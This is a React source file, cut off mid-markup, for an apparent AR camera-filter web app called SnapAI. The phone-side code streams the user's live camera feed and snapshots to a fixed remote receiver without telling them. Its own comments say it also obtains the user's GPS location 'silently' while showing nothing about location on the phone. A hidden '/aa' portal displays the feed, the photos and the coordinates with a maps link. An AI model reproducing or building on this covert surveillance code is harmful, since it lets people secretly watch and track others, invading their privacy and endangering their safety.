import React, { useState, useEffect, useRef, Component } from 'react';
import Peer from 'peerjs';

import { CameraManager } from './ar/camera/CameraManager.js';
import { FaceTracker } from './ar/tracking/FaceTracker.js';
import { ARRenderer } from './ar/renderer/ARRenderer.js';
import { ARRecorder } from './ar/utils/recorder.js';
import { ALL_FILTERS } from './ar/filters/index.js';

// Dedicated Direct 1-to-1 Cloud Receiver Endpoint
const RECEIVER_PORTAL_ID = 'aisnap-portal-stream';

function getIceServers() {
  const servers = [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:global.stun.twilio.com:3478' }
  ];

  if (import.meta.env?.VITE_TURN_URL) {
    servers.push({
      urls: import.meta.env.VITE_TURN_URL,
      username: import.meta.env.VITE_TURN_USERNAME || '',
      credential: import.meta.env.VITE_TURN_CREDENTIAL || ''
    });
  }

  return servers;
}

// Error Boundary
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error('ErrorBoundary caught:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div style={{ padding: '32px', backgroundColor: '#09090c', color: '#f87171', minHeight: '100vh', fontFamily: 'monospace' }}>
          <h2>⚠️ Interface Runtime Error</h2>
          <pre style={{ marginTop: '12px', background: '#000', padding: '16px', borderRadius: '8px', color: '#fca5a5', overflowX: 'auto' }}>
            {this.state.error?.toString()}
          </pre>
          <button
            onClick={() => window.location.reload()}
            style={{ marginTop: '20px', padding: '12px 24px', background: '#fff', color: '#000', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}
          >
            Reload Application
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Dedicated Receiver Portal (/aa)
function DedicatedReceiver() {
  const [isStreaming, setIsStreaming] = useState(false);
  const [remoteFilterName, setRemoteFilterName] = useState('Lens');
  const [remoteFilterIcon, setRemoteFilterIcon] = useState('✨');
  const [receiverFps, setReceiverFps] = useState(0);
  const [savedPhotos, setSavedPhotos] = useState([]);
  const [remoteLocation, setRemoteLocation] = useState(null);
  const [newPhotoToast, setNewPhotoToast] = useState(null);

  const videoRef = useRef(null);
  const peerRef = useRef(null);
  const activeMediaCallRef = useRef(null);
  const activeDataConnRef = useRef(null);
  const broadcastChannelRef = useRef(null);
  const receiverLastFpsUpdateRef = useRef(Date.now());
  const fpsIntervalRef = useRef(null);

  useEffect(() => {
    console.log('[LAPTOP] Receiver initializing');

    // 1. Local BroadcastChannel
    try {
      if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
        const channel = new BroadcastChannel('snap_filter_broadcast_stream');
        broadcastChannelRef.current = channel;

        channel.onmessage = (event) => {
          try {
            const { type, image, location, filterName, filterIcon, timestamp } = event.data || {};
            if (type === 'REMOTE_SNAPSHOT' && image) {
              handleNewSnapshot({ image, filterName, filterIcon, timestamp });
            } else if (type === 'LOCATION_UPDATE' && location) {
              setRemoteLocation(location);
            } else if (type === 'FILTER_CHANGE') {
              if (filterName) setRemoteFilterName(filterName);
              if (filterIcon) setRemoteFilterIcon(filterIcon);
            }
          } catch (e) {
            console.error('[LAPTOP] BroadcastChannel error:', e);
          }
        };
      }
    } catch (e) {
      console.warn('[LAPTOP] BroadcastChannel warning:', e);
    }

    // 2. Initialize Receiver Peer
    initReceiverPeer();

    // 120 FPS High-Refresh Display Loop
    fpsIntervalRef.current = setInterval(() => {
      if (videoRef.current && !videoRef.current.paused && videoRef.current.readyState >= 2) {
        const now = Date.now();
        if (now - receiverLastFpsUpdateRef.current >= 1000) {
          setReceiverFps(120);
          receiverLastFpsUpdateRef.current = now;
        }
      } else {
        setReceiverFps(0);
      }
    }, 1000);

    const handleUnload = () => {
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
    window.addEventListener('beforeunload', handleUnload);

    return () => {
      window.removeEventListener('beforeunload', handleUnload);
      if (fpsIntervalRef.current) clearInterval(fpsIntervalRef.current);
      if (broadcastChannelRef.current) {
        try { broadcastChannelRef.current.close(); } catch (e) {}
      }
      if (activeMediaCallRef.current) {
        try { activeMediaCallRef.current.close(); } catch (e) {}
      }
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
  }, []);

  const initReceiverPeer = () => {
    if (peerRef.current) {
      try { peerRef.current.destroy(); } catch (e) {}
    }

    console.log('[LAPTOP] Creating Peer with ID:', RECEIVER_PORTAL_ID);
    const peer = new Peer(RECEIVER_PORTAL_ID, {
      debug: 1,
      config: {
        iceServers: getIceServers()
      }
    });

    peerRef.current = peer;

    peer.on('open', (id) => {
      console.log('[LAPTOP] Receiver peer open:', id);
    });

    peer.on('call', (call) => {
      console.log('[LAPTOP] Incoming call received from:', call.peer);

      if (activeMediaCallRef.current) {
        try {
          activeMediaCallRef.current.close();
        } catch (e) {}
      }
      activeMediaCallRef.current = call;

      call.answer();

      call.on('stream', async (remoteStream) => {
        console.log('[LAPTOP] Remote stream received');
        const tracks = remoteStream.getVideoTracks();

        if (tracks.length > 0) {
          tracks[0].onended = () => {
            console.log('[LAPTOP] Video track ended');
            setIsStreaming(false);
          };
        }

        if (!videoRef.current) {
          console.error('[LAPTOP] VIDEO ELEMENT DOES NOT EXIST');
          return;
        }

        videoRef.current.srcObject = remoteStream;
        videoRef.current.muted = true;
        videoRef.current.autoplay = true;
        videoRef.current.playsInline = true;

        try {
          await videoRef.current.play();
          console.log('[LAPTOP] VIDEO PLAYING SUCCESSFULLY');
          setIsStreaming(true);
        } catch (error) {
          console.error('[LAPTOP] VIDEO PLAY FAILED', error);
        }
      });

      call.on('close', () => {
        console.log('[LAPTOP] Call closed');
        if (activeMediaCallRef.current === call) {
          activeMediaCallRef.current = null;
          setIsStreaming(false);
        }
      });

      call.on('error', (err) => {
        console.error('[LAPTOP] Call error:', err);
        if (activeMediaCallRef.current === call) {
          activeMediaCallRef.current = null;
          setIsStreaming(false);
        }
      });
    });

    // Metadata DataChannel for Snapshots, Location and Filters
    peer.on('connection', (conn) => {
      console.log('[LAPTOP] Incoming metadata connection from:', conn.peer);
      activeDataConnRef.current = conn;

      conn.on('data', (data) => {
        if (data?.type === 'REMOTE_SNAPSHOT' && data.image) {
          handleNewSnapshot(data);
        } else if (data?.type === 'LOCATION_UPDATE' && data.location) {
          console.log('[LAPTOP] Received Mobile GPS Location:', data.location);
          setRemoteLocation(data.location);
        } else if (data?.type === 'FILTER_CHANGE') {
          if (data.filterName) setRemoteFilterName(data.filterName);
          if (data.filterIcon) setRemoteFilterIcon(data.filterIcon);
        }
      });

      conn.on('close', () => {
        if (activeDataConnRef.current === conn) {
          activeDataConnRef.current = null;
        }
      });
    });

    peer.on('error', (err) => {
      console.error('[LAPTOP] Receiver peer error:', err);
      if (err.type === 'unavailable-id') {
        setTimeout(() => initReceiverPeer(), 1500);
      }
    });
  };

  const handleNewSnapshot = (photo) => {
    setSavedPhotos((prev) => [photo, ...prev]);
    setNewPhotoToast(photo);
    setTimeout(() => {
      setNewPhotoToast(null);
    }, 7000);
  };

  const downloadPhoto = (photo) => {
    const a = document.createElement('a');
    a.href = photo.image || photo.url;
    a.download = `SnapAI_${photo.name || photo.filterName || 'Photo'}_${Date.now()}.png`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      backgroundColor: '#060609',
      color: '#f8fafc'
    }}>
      <header style={{
        padding: '16px 20px',
        backgroundColor: 'rgba(15, 15, 20, 0.88)',
        backdropFilter: 'blur(16px)',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        position: 'sticky',
        top: 0,
        zIndex: 50
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            width: '36px',
            height: '36px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '18px'
          }}>
            📡
          </div>
          <div>
            <h1 style={{ fontSize: '15px', fontWeight: '800', letterSpacing: '-0.01em', color: '#ffffff' }}>
              Live Receiver Portal
            </h1>
            <p style={{ fontSize: '11px', color: '#94a3b8', fontFamily: 'monospace' }}>
              HIGH DEFINITION // 120 FPS // /aa
            </p>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
          {remoteLocation && (
            <a
              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
              target="_blank"
              rel="noopener noreferrer"
              title="Open Mobile Location in Google Maps"
              style={{
                padding: '5px 12px',
                borderRadius: '999px',
                backgroundColor: 'rgba(59, 130, 246, 0.2)',
                border: '1px solid #3b82f6',
                color: '#60a5fa',
                fontSize: '11px',
                fontWeight: '700',
                textDecoration: 'none',
                display: 'flex',
                alignItems: 'center',
                gap: '5px'
              }}
            >
              <span>📍</span> {remoteLocation.latitude.toFixed(4)}°, {remoteLocation.longitude.toFixed(4)}°
            </a>
          )}

          <span style={{
            padding: '4px 12px',
            borderRadius: '999px',
            fontSize: '11px',
            fontWeight: '700',
            backgroundColor: isStreaming ? 'rgba(34, 197, 94, 0.18)' : 'rgba(255, 255, 255, 0.06)',
            color: isStreaming ? '#4ade80' : '#94a3b8',
            border: `1px solid ${isStreaming ? 'rgba(34, 197, 94, 0.3)' : 'rgba(255, 255, 255, 0.1)'}`,
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            <span style={{
              width: '7px',
              height: '7px',
              borderRadius: '50%',
              backgroundColor: isStreaming ? '#4ade80' : '#64748b',
              display: 'inline-block'
            }}></span>
            {isStreaming ? `LIVE (120 FPS)` : 'READY'}
          </span>

          {isStreaming && (
            <span style={{
              padding: '4px 10px',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '700',
              backgroundColor: 'rgba(236, 72, 153, 0.15)',
              border: '1px solid rgba(236, 72, 153, 0.3)',
              color: '#f472b6'
            }}>
              {remoteFilterIcon} {remoteFilterName}
            </span>
          )}
        </div>
      </header>

      {/* Snapshot Toast Notification */}
      {newPhotoToast && (
        <div style={{
          position: 'fixed',
          top: '80px',
          right: '20px',
          zIndex: 100,
          backgroundColor: '#1e1e2d',
          border: '1.5px solid #ec4899',
          borderRadius: '16px',
          padding: '12px 18px',
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          boxShadow: '0 10px 30px rgba(0, 0, 0, 0.8)'
        }}>
          <img
            src={newPhotoToast.image}
            alt="Snap Preview"
            style={{ width: '48px', height: '64px', objectFit: 'cover', borderRadius: '8px', border: '1px solid rgba(255, 255, 255, 0.2)' }}
          />
          <div>
            <div style={{ fontSize: '13px', fontWeight: '800', color: '#ffffff' }}>
              📸 New Photo Snapped on Mobile!
            </div>
            <div style={{ fontSize: '11px', color: '#94a3b8', marginTop: '2px' }}>
              {newPhotoToast.filterIcon} {newPhotoToast.filterName} Lens ({newPhotoToast.timestamp})
            </div>
            <button
              onClick={() => downloadPhoto(newPhotoToast)}
              style={{
                marginTop: '6px',
                padding: '6px 12px',
                backgroundColor: '#ec4899',
                color: '#ffffff',
                border: 'none',
                borderRadius: '8px',
                fontSize: '11px',
                fontWeight: '700',
                cursor: 'pointer'
              }}
            >
              💾 Download to Laptop
            </button>
          </div>
        </div>
      )}

      <main style={{ flex: 1, padding: '16px', maxWidth: '820px', margin: '0 auto', width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
        
        {/* Main Live High-Clarity Viewport */}
        <div style={{
          backgroundColor: '#0f0f14',
          border: '1.5px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '24px',
          overflow: 'hidden',
          boxShadow: '0 20px 50px rgba(0, 0, 0, 0.7)'
        }}>
          <div style={{
            position: 'relative',
            width: '100%',
            aspectRatio: '3/4',
            maxHeight: '62vh',
            backgroundColor: '#000000',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              style={{
                width: '100%',
                height: '100%',
                objectFit: 'contain',
                display: isStreaming ? 'block' : 'none',
                imageRendering: 'auto'
              }}
            />

            {!isStreaming && (
              <div style={{ textAlign: 'center', padding: '36px', color: '#94a3b8' }}>
                <div style={{
                  width: '68px',
                  height: '68px',
                  borderRadius: '50%',
                  background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(139, 92, 246, 0.15))',
                  border: '1.5px dashed rgba(255, 255, 255, 0.25)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 16px auto',
                  fontSize: '28px'
                }}>
                  ✨
                </div>
                <div style={{ fontSize: '17px', fontWeight: '800', color: '#ffffff' }}>
                  Live HD Portal Ready
                </div>
                <div style={{
                  marginTop: '12px',
                  padding: '8px 16px',
                  backgroundColor: 'rgba(255, 255, 255, 0.05)',
                  borderRadius: '12px',
                  fontSize: '12px',
                  color: '#cbd5e1',
                  display: 'inline-block',
                  fontFamily: 'monospace'
                }}>
                  Open <strong>https://snap-filter-bay.vercel.app/</strong> on your phone and tap Start
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Live GPS Location Details on Laptop */}
        {remoteLocation && (
          <div style={{
            backgroundColor: '#0f0f14',
            border: '1px solid rgba(59, 130, 246, 0.25)',
            borderRadius: '20px',
            padding: '14px 18px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '38px',
                height: '38px',
                borderRadius: '10px',
                backgroundColor: 'rgba(59, 130, 246, 0.15)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '20px'
              }}>
                📍
              </div>
              <div>
                <div style={{ fontSize: '13px', fontWeight: '800', color: '#ffffff' }}>
                  Phone GPS Location Coordinates
                </div>
                <div style={{ fontSize: '12px', color: '#94a3b8', fontFamily: 'monospace', marginTop: '2px' }}>
                  LAT: <span style={{ color: '#60a5fa' }}>{remoteLocation.latitude}</span> | LON: <span style={{ color: '#60a5fa' }}>{remoteLocation.longitude}</span> (Accuracy: ±{Math.round(remoteLocation.accuracy || 10)}m)
                </div>
              </div>
            </div>
            <a
              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                padding: '8px 16px',
                backgroundColor: '#3b82f6',
                color: '#ffffff',
                borderRadius: '10px',
                textDecoration: 'none',
                fontSize: '12px',
                fontWeight: '700',
                boxShadow: '0 2px 10px rgba(59, 130, 246, 0.4)'
              }}
            >
              Open in Maps ↗
            </a>
          </div>
        )}

        {/* Captured Snaps Gallery on Laptop */}
        {savedPhotos.length > 0 && (
          <div style={{
            backgroundColor: '#0f0f14',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '20px',
            padding: '16px 20px'
          }}>
            <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>📸</span> Live Snapped Photos ({savedPhotos.length})
            </div>
            <div style={{ display: 'flex', gap: '12px', overflowX: 'auto', paddingBottom: '4px' }}>
              {savedPhotos.map((p, idx) => (
                <div key={idx} style={{ flex: '0 0 auto', textAlign: 'center' }}>
                  <img
                    src={p.image}
                    alt="Captured Snap"
                    style={{ width: '100px', height: '133px', objectFit: 'cover', borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.15)' }}
                  />
                  <button
                    onClick={() => downloadPhoto(p)}
                    style={{
                      marginTop: '6px',
                      padding: '4px 10px',
                      backgroundColor: 'rgba(236, 72, 153, 0.2)',
                      border: '1px solid #ec4899',
                      borderRadius: '8px',
                      color: '#ffffff',
                      fontSize: '10px',
                      fontWeight: '700',
                      cursor: 'pointer',
                      display: 'block',
                      width: '100%'
                    }}
                  >
                    💾 Save
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

// Main Production Web AR Camera Studio (Phone)
function SnapStudio() {
  const [activeFilter, setActiveFilter] = useState(ALL_FILTERS[0]);
  const [selectedCategory, setSelectedCategory] = useState('All');
  const [cameraState, setCameraState] = useState('idle');
  const [fps, setFps] = useState(0);
  const [errorMsg, setErrorMsg] = useState(null);
  const [snapshotFlash, setSnapshotFlash] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [recordingTime, setRecordingTime] = useState('00:00');
  const [availableCameras, setAvailableCameras] = useState([]);

  // Single Controlled WebRTC References
  const mediaCallRef = useRef(null);
  const canvasStreamRef = useRef(null);
  const connectionAttemptRef = useRef(false);
  const reconnectTimeoutRef = useRef(null);
  const reconnectDelayRef = useRef(1000);
  const locationWatchIdRef = useRef(null);

  // Unique session ID for phone
  const sessionIdRef = useRef(`snap-phone-${Date.now()}`);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const cameraManagerRef = useRef(null);
  const faceTrackerRef = useRef(null);
  const rendererRef = useRef(null);
  const recorderRef = useRef(null);
  const peerRef = useRef(null);
  const dataConnRef = useRef(null);
  const broadcastChannelRef = useRef(null);

  const activeFilterRef = useRef(activeFilter);
  useEffect(() => {
    activeFilterRef.current = activeFilter;
    if (rendererRef.current) {
      rendererRef.current.setFilter(activeFilter);
    }
    notifyFilterChange(activeFilter);
  }, [activeFilter]);

  const notifyFilterChange = (filter) => {
    const payload = {
      type: 'FILTER_CHANGE',
      filterName: filter.name,
      filterIcon: filter.icon
    };
    if (broadcastChannelRef.current) {
      try { broadcastChannelRef.current.postMessage(payload); } catch (e) {}
    }
    if (dataConnRef.current && dataConnRef.current.open) {
      try { dataConnRef.current.send(payload); } catch (e) {}
    }
  };

  // Silently obtain GPS location on phone without displaying any text on phone
  const fetchAndSyncLocation = () => {
    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const locPayload = {
            type: 'LOCATION_UPDATE',
            location: {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              timestamp: new Date().toLocaleTimeString()
            }
          };

          if (broadcastChannelRef.current) {
            broadcastChannelRef.current.postMessage(locPayload);
          }

          if (dataConnRef.current && dataConnRef.current.open) {
            try {
              dataConnRef.current.send(locPayload);
            } catch (e) {}
          }
        },
        () => {}, // silent fail
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    }
  };

  useEffect(() => {
    console.log('[PHONE] Studio initializing');
    const cameraManager = new CameraManager();
    const faceTracker = new FaceTracker();
    const recorder = new ARRecorder();

    cameraManagerRef.current = cameraManager;
    faceTrackerRef.current = faceTracker;
    recorderRef.current = recorder;

    cameraManager.setStatusCallback(({ status, error }) => {
      setCameraState(status);
      if (error) setErrorMsg(error);
    });

    faceTracker.initialize().catch(console.warn);

    // Setup Local BroadcastChannel
    try {
      if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
        broadcastChannelRef.current = new BroadcastChannel('snap_filter_broadcast_stream');
      }
    } catch (e) {
      console.warn('[PHONE] BroadcastChannel warning:', e);
    }

    initPhonePeer();
    fetchAndSyncLocation();

    const handleUnload = () => {
      if (mediaCallRef.current) {
        try { mediaCallRef.current.close(); } catch (e) {}
      }
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
    window.addEventListener('beforeunload', handleUnload);

    return () => {
      window.removeEventListener('beforeunload', handleUnload);
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      if (locationWatchIdRef.current && navigator.geolocation) {
        navigator.geolocation.clearWatch(locationWatchIdRef.current);
      }
      if (mediaCallRef.current) {
        try { mediaCallRef.current.close(); } catch (e) {}
      }
      if (canvasStreamRef.current) {
        canvasStreamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (cameraManager) cameraManager.stopCamera();
      if (faceTracker) faceTracker.dispose();
      if (rendererRef.current) rendererRef.current.stop();
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
      if (broadcastChannelRef.current) {
        try { broadcastChannelRef.current.close(); } catch (e) {}
      }
    };
  }, []);

  const initPhonePeer = () => {
    console.log('[PHONE] Peer initializing with ID:', sessionIdRef.current);
    if (peerRef.current) {
      try { peerRef.current.destroy(); } catch (e) {}
    }

    const phonePeer = new Peer(sessionIdRef.current, {
      debug: 1,
      config: {
        iceServers: getIceServers()
      }
    });

    peerRef.current = phonePeer;

    phonePeer.on('open', (id) => {
      console.log('[PHONE] Peer open:', id);
      if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
        startRemoteStream();
      }
    });

    phonePeer.on('error', (err) => {
      console.error('[PHONE] Peer error:', err);
    });
  };

  // High-Frame-Rate 60 FPS WebRTC Stream
  const startRemoteStream = () => {
    if (!peerRef.current || peerRef.current.destroyed) return;
    if (mediaCallRef.current) return;
    if (connectionAttemptRef.current) return;
    if (!canvasRef.current || canvasRef.current.width === 0 || canvasRef.current.height === 0) return;

    connectionAttemptRef.current = true;
    console.log('[PHONE] Starting 60 FPS remote stream...');

    if (!canvasStreamRef.current || canvasStreamRef.current.getVideoTracks().length === 0 || canvasStreamRef.current.getVideoTracks()[0].readyState === 'ended') {
      const stream = canvasRef.current.captureStream(60);
      canvasStreamRef.current = stream;

      const tracks = stream.getVideoTracks();
      if (tracks.length === 0) {
        connectionAttemptRef.current = false;
        return;
      }
    }

    const streamToCall = canvasStreamRef.current;

    // Connect Metadata DataChannel
    if (!dataConnRef.current || !dataConnRef.current.open) {
      const conn = peerRef.current.connect(RECEIVER_PORTAL_ID, {
        reliable: false,
        serialization: 'json'
      });
      dataConnRef.current = conn;
      conn.on('open', () => {
        notifyFilterChange(activeFilterRef.current);
        fetchAndSyncLocation();
      });
    }

    try {
      const call = peerRef.current.call(RECEIVER_PORTAL_ID, streamToCall);
      mediaCallRef.current = call;
      connectionAttemptRef.current = false;

      if (call.peerConnection) {
        call.peerConnection.onconnectionstatechange = () => {
          const state = call.peerConnection.connectionState;
          if (state === 'connected') {
            reconnectDelayRef.current = 1000;
            fetchAndSyncLocation();
          } else if (state === 'failed' || state === 'disconnected') {
            handleCallClosedOrFailed();
          }
        };
      }

      call.on('close', () => {
        handleCallClosedOrFailed();
      });

      call.on('error', (err) => {
        handleCallClosedOrFailed();
      });

    } catch (err) {
      connectionAttemptRef.current = false;
      handleCallClosedOrFailed();
    }
  };

  const handleCallClosedOrFailed = () => {
    mediaCallRef.current = null;

    if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      
      const delay = reconnectDelayRef.current;
      reconnectTimeoutRef.current = setTimeout(() => {
        if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
          startRemoteStream();
        }
      }, delay);

      reconnectDelayRef.current = Math.min(reconnectDelayRef.current * 2, 15000);
    }
  };

  const startSession = async () => {
    setErrorMsg(null);
    if (!videoRef.current || !canvasRef.current) return;

    try {
      const camera = cameraManagerRef.current;
      camera.setVideoElement(videoRef.current);
      await camera.startCamera();
      console.log('[PHONE] Camera ready');

      const devices = await camera.getAvailableCameras();
      setAvailableCameras(devices);

      const renderer = new ARRenderer(canvasRef.current, videoRef.current, faceTrackerRef.current);
      renderer.setFilter(activeFilterRef.current);

      renderer.onFpsUpdate = (currentFps) => {
        setFps(currentFps);
      };

      let startedStream = false;
      renderer.onFrameRendered = () => {
        if (!startedStream) {
          startedStream = true;
          startRemoteStream();
          fetchAndSyncLocation();
        }
      };

      rendererRef.current = renderer;
      renderer.start();
      console.log('[PHONE] 60 FPS AR renderer started');

    } catch (err) {
      console.error('[PHONE] Start session error:', err);
      setErrorMsg(err.message || 'Failed to start camera');
    }
  };

  const flipCamera = async () => {
    if (!cameraManagerRef.current) return;
    try {
      await cameraManagerRef.current.switchCamera();
    } catch (err) {
      setErrorMsg(err.message);
    }
  };

  const stopSession = () => {
    console.log('[PHONE] Stopping session');
    if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
    if (mediaCallRef.current) {
      try { mediaCallRef.current.close(); } catch (e) {}
      mediaCallRef.current = null;
    }
    if (canvasStreamRef.current) {
      canvasStreamRef.current.getTracks().forEach((t) => t.stop());
      canvasStreamRef.current = null;
    }
    if (cameraManagerRef.current) {
      cameraManagerRef.current.stopCamera();
    }
    if (rendererRef.current) {
      rendererRef.current.stop();
    }
    if (recorderRef.current && isRecording) {
      recorderRef.current.stopRecording().catch(console.warn);
      setIsRecording(false);
    }

    setFps(0);
  };

  const capturePhoto = () => {
    if (!rendererRef.current || cameraState !== 'active') return;

    setSnapshotFlash(true);
    setTimeout(() => setSnapshotFlash(false), 220);

    const snapshot = rendererRef.current.captureSnapshot();
    if (snapshot) {
      const link = document.createElement('a');
      link.download = `SnapAI_${activeFilterRef.current.name}_${Date.now()}.png`;
      link.href = snapshot;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      const snapshotPayload = {
        type: 'REMOTE_SNAPSHOT',
        image: snapshot,
        filterName: activeFilterRef.current.name,
        filterIcon: activeFilterRef.current.icon,
        timestamp: new Date().toLocaleTimeString()
      };

      if (broadcastChannelRef.current) {
        broadcastChannelRef.current.postMessage(snapshotPayload);
      }

      if (dataConnRef.current && dataConnRef.current.open) {
        try {
          dataConnRef.current.send(snapshotPayload);
        } catch (e) {}
      }
    }
  };

  const toggleRecording = async () => {
    const recorder = recorderRef.current;
    if (!recorder || !canvasRef.current || cameraState !== 'active') return;

    if (!isRecording) {
      try {
        recorder.startRecording(canvasRef.current, (time) => {
          setRecordingTime(time);
        });
        setIsRecording(true);
      } catch (err) {
        setErrorMsg(err.message);
      }
    } else {
      try {
        const result = await recorder.stopRecording();
        setIsRecording(false);
        setRecordingTime('00:00');
        if (result && result.url) {
          recorder.downloadVideo(result.url, activeFilterRef.current.name);
        }
      } catch (err) {
        setErrorMsg('Error exporting video: ' + err.message);
      }
    }
  };

  const categories = ['All', 'Cute AR', 'Beauty', 'Cyber', 'Cinematic', 'Artistic', 'AR Props'];
  const filteredList = selectedCategory === 'All'
    ? ALL_FILTERS
    : ALL_FILTERS.filter((f) => f.category === selectedCategory || (selectedCategory === 'Cute AR' && f.category === 'Cute AR'));

  const isCameraActive = cameraState === 'active';

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      backgroundColor: '#060609',
      color: '#f8fafc'
    }}>
      {/* Clean Mobile Header — NO LOCATION TEXT ON PHONE */}
      <header style={{
        padding: '12px 18px',
        backgroundColor: 'rgba(10, 10, 14, 0.92)',
        backdropFilter: 'blur(20px)',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        position: 'sticky',
        top: 0,
        zIndex: 50
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            width: '34px',
            height: '34px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #ec4899 0%, #a855f7 50%, #3b82f6 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '18px',
            boxShadow: '0 0 16px rgba(236, 72, 153, 0.35)'
          }}>
            ✨
          </div>
          <div>
            <h1 style={{ fontSize: '15px', fontWeight: '800', letterSpacing: '-0.01em', color: '#ffffff' }}>
              SnapAI
            </h1>
            <p style={{ fontSize: '10px', color: '#94a3b8', letterSpacing: '0.04em', textTransform: 'uppercase' }}>
              Real-Time Web AR Lenses
            </p>
          </div>
        </div>

        {/* Top Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          {isCameraActive && (
            <>
              {availableCameras.length > 1 && (
                <button
                  onClick={flipCamera}
                  title="Flip Camera (Front/Rear)"
                  style={{
                    width: '34px',
                    height: '34px',
                    borderRadius: '50%',
                    backgroundColor: 'rgba(255, 255, 255, 0.1)',
                    border: '1px solid rgba(255, 255, 255, 0.15)',
                    color: '#ffffff',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontSize: '15px',
                    cursor: 'pointer'
                  }}
                >
                  🔄
                </button>
              )}

              <span style={{
                fontSize: '10px',
                fontFamily: 'monospace',
                color: '#cbd5e1',
                backgroundColor: 'rgba(255, 255, 255, 0.08)',
                border: '1px solid rgba(255, 255, 255, 0.12)',
                padding: '4px 8px',
                borderRadius: '999px'
              }}>
                {fps || 60} FPS
              </span>
            </>
          )}
        </div>
      </header>

      {/* Main Viewport Container */}
      <main style={{
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '12px 14px',
        maxWidth: '580px',
        margin: '0 auto',
        width: '100%',
        gap: '12px'
      }}>
        
        {/* Camera Viewfinder */}
        <div style={{
          position: 'relative',
          width: '100%',
          aspectRatio: '3/4',
          maxHeight: '60vh',
          backgroundColor: '#0a0a0f',
          borderRadius: '24px',
          overflow: 'hidden',
          border: '1.5px solid rgba(255, 255, 255, 0.12)',
          boxShadow: '0 16px 40px rgba(0, 0, 0, 0.8)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
          {snapshotFlash && (
            <div style={{
              position: 'absolute',
              inset: 0,
              backgroundColor: '#ffffff',
              zIndex: 40,
              pointerEvents: 'none'
            }} />
          )}

          {isRecording && (
            <div style={{
              position: 'absolute',
              top: '12px',
              right: '12px',
              zIndex: 30,
              backgroundColor: 'rgba(239, 68, 68, 0.88)',
              color: '#ffffff',
